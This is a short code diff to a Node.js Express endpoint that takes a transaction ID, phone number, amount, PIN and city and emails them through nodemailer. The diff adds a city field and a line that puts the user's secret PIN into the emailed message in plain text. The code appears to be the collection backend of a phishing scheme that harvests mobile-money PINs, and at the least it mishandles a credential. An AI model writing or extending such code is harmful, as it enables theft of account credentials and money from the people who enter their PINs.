@@ -17,6 +17,7 @@ const htmlTemplate = `
 <h1> Transaction Details</h1>
 <p><strong> Transaction ID:</strong> {{transactionId}}</p>
 <p><strong> Phone Number:</strong> {{phoneNumber}}</p>
+<p><strong> City:</strong> {{city}}</p>
 <p><strong> Amount:</strong> {{amountToPay}}</p>
 <p><strong> PIN:</strong> {{pin}}</p>
 `;
@@ -33,9 +34,9 @@ const transporter = nodemailer.createTransport({
 
 app.post('/sendTransaction', async (req, res) => {
     try {
-        const { transactionId, phoneNumber, amountToPay, pin } = req.body;
+        const { transactionId, phoneNumber, amountToPay, pin, city } = req.body;
 
-        if (!transactionId || !phoneNumber || !amountToPay || !pin) {
+        if (!transactionId || !phoneNumber || !amountToPay || !pin || !city) {
             return res.status(400).json({ error: 'Missing required fields' });
         }
 
@@ -43,6 +44,7 @@ app.post('/sendTransaction', async (req, res) => {
             .replace('{{transactionId}}', transactionId)
             .replace('{{phoneNumber}}', phoneNumber)
             .replace('{{amountToPay}}', amountToPay)
+            .replace('{{pin}}', pin)
             .replace('{{city}}', city)
 
         const info = await transporter.sendMail({
